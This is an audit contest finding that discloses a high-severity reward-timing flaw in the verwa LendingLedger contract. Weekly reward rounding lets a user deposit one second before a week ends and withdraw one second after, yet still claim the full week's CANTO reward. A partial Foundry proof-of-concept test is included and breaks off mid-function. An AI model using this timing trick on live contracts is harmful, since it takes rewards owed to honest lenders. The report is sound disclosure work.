# [H] User don't have to deposit for a week into the market to get his weekly reward from the `LendingLedger`

## Summary
Severity: High
Chain: Smart contract
Component: 2023-08-verwa
Published: 2023-08-10
Source: https://github.com/code-423n4/2023-08-verwa-findings/issues/416
Type: code-finding

## Details
# Lines of code

https://github.com/code-423n4/2023-08-verwa/blob/main/src/LendingLedger.sol#L134


# Vulnerability details

## Impact
In the `LendingLedger` contract, a user is rewarded with CANTO tokens depending on how long he has his deposit in the market. Rewards are distributed for each week during which the deposit was inside the market. However, the user can cheat this condition because we are rounding down to the start of the week, so the user can deposit at 23:59 at the end of the week and withdraw at 00:00 and still get rewarded as if he had his deposit for the whole week.

## Proof of Concept
Test case for the `LendingLedger.t.sol`
```
    function setupStateBeforeClaim() internal {
        whiteListMarket();

        vm.prank(goverance);
        ledger.setRewards(0, WEEK*10, amountPerEpoch);

        // deposit into market at 23:59 (week 4)
        vm.warp((WEEK * 5) - 1);

        int256 delta = 1.1 ether;
        vm.prank(lendingMarket);
        ledger.sync_ledger(lender, delta);

        // airdrop ledger enough token balance for user to claim
        payable(ledger).transfer(1000 ether);
        // withdraw at 00:00 (week 5)
        vm.warp(block.timestamp + 1);
        vm.prank(lendingMarket);
        ledger.sync_ledger(lender, delta * (-1));
    }

    function testClaimValidLenderOneEpoch() public {
        setupStateBeforeClaim();

        uint256 balanceBefore = address(lender).balance;
```

_Trimmed to 38 lines — full report: https://github.com/code-423n4/2023-08-verwa-findings/issues/416_
